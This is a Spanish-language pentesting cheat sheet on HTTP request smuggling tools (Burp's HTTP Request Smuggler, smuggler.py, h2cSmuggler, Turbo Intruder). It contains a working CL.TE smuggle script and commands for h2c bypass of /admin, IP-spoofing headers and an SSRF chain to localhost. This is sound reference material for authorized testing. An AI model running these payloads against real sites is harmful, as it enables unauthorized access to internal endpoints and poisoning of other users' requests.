---
aliases:
  - HTTP Request Smuggler Burp
  - smuggler.py
  - h2cSmuggler
  - Turbo Intruder
tags:
  - vuln/http-smuggling
  - technique/discovery
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Request Smuggling]]"
  - "[[Burp Suite]]"
---
# HTTP Request Smuggling - Tooling

---

## HTTP Request Smuggler (Burp Extension)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "HTTP Request Smuggler" → Install | Setup extension (James Kettle / PortSwigger) | Primera vez. |
| Right-click request → "HTTP Request Smuggler" → "Smuggle probe" | Auto-detect CL.TE/TE.CL/TE.TE/CL.CL/H2.* | Initial detection. |
| Right-click → "HTTP Request Smuggler" → "Smuggle attack" → seleccionar tipo | Crafting interactivo con templates | Post-detection exploit. |
| Burp Repeater → toggle HTTP/2 → "Inspector" → "Request smuggling" mode | H2.CL / H2.TE / pseudo-header injection | H2 endpoints. |
| Burp Repeater → "Send group → in single connection" | Reproducir HRS multi-request | Validation. |
| Right-click smuggle attack → "Send to Turbo Intruder" | Race + smuggle combo | Volume testing. |
| Smuggle attack → "Validate" button | Double-check vector antes de exploit | Pre-exploit confirmation. |
| Burp Smuggler → "Cache poisoning via smuggling" mode | Auto-setup cache poison combo | Specific chain. |
^hrs-tool-burp

---

## smuggler.py (defparam)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/defparam/smuggler && cd smuggler` | Install CLI standalone | Primera vez. |
| `python3 smuggler.py -u https://target/` | Test all techniques contra URL | Quick scan. |
| `python3 smuggler.py -u https://target/ -v v` | Verbose timing logs | Debug. |
| `python3 smuggler.py -u https://target/ -m exploit_clte` | Solo CL.TE technique | Targeted test. |
| `python3 smuggler.py -l urls.txt -t 5` | Bulk multiple URLs | Volume scan. |
| `python3 smuggler.py -u https://target/ --no-verify` | Skip TLS validation | Labs / self-signed. |
| `python3 smuggler.py -u https://target/ > findings.log` | Output a archivo reportable | Post-scan capture. |
| `python3 smuggler.py -u https://target/ --timeout 10` | Aumentar timeout | Slow targets. |
^hrs-tool-smuggler-py

---

## h2cSmuggler (BishopFox)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/BishopFox/h2csmuggler && cd h2csmuggler` | Install h2cSmuggler | Primera vez. |
| `python3 h2csmuggler.py -x https://target/` | Detecta si frontend acepta h2c upgrade | Initial probe. |
| `python3 h2csmuggler.py -x https://target/ -X /admin` | Acceder endpoint vía h2c túnel | Bypass front controls. |
| `python3 h2csmuggler.py -x https://target/ -X "POST /api" --post-data 'x=1'` | POST con body via h2c | Modify operations. |
| `python3 h2csmuggler.py -x https://target/ -X /admin -H "X-Forwarded-For: 127.0.0.1"` | h2c + IP spoof bypass combo | Internal IP allowlist. |
| `for p in /admin /api/internal /actuator /debug /health; do python3 h2csmuggler.py -x https://target/ -X "GET $p"; done` | Bulk path enumeration via h2c | Discovery. |
| `python3 h2csmuggler.py -x https://target/ -X "GET /api/proxy?url=http://127.0.0.1:8080/admin"` | h2c + SSRF chain | Compound. |
| `python3 h2csmuggler.py -x https://target/ -v` | Frame-level debug | Troubleshoot. |
^hrs-tool-h2csmuggler

### Workflow h2cSmuggler

```bash
# 1. Detectar
python3 h2csmuggler.py -x https://target/

# Si responde "Server is vulnerable" → continuar

# 2. Enumerar internos
for path in /admin /api/internal /actuator /debug /health; do
  python3 h2csmuggler.py -x https://target/ -X "GET $path"
done

# 3. Combinar con SSRF interno
python3 h2csmuggler.py -x https://target/ \
  -X "GET /api/proxy?url=http://127.0.0.1:8080/admin"
```

---

## Turbo Intruder Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "Turbo Intruder" → Install | Setup extension | Primera vez. |
| Right-click request → "Send to Turbo Intruder" → script con `engine=Engine.BURP, concurrentConnections=1, pipeline=False` | Single-conn HRS race setup | HRS race timing. |
| Script con `engine.queue(smuggle_req); for i in range(10): engine.queue(legit_req)` | Queue poisoning bulk | Multi-victim race. |
| Browser → https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples → ver scripts ejemplo | Templates HRS oficiales | Foundation. |
| `python3 -c "body = '...smuggled...'; print(len(body))"` | Calc CL bytes en script | Manual byte count. |
| Turbo Intruder script con `requestsPerConnection=100` | Volume race en single conn | Stress test. |
^hrs-tool-turbo

### Script Turbo Intruder ejemplo (CL.TE smuggle queue)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    smuggle = '''POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: x'''

    engine.queue(smuggle)
    for i in range(10):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if 'admin' in req.response or req.status != 200:
        table.add(req)
```

---
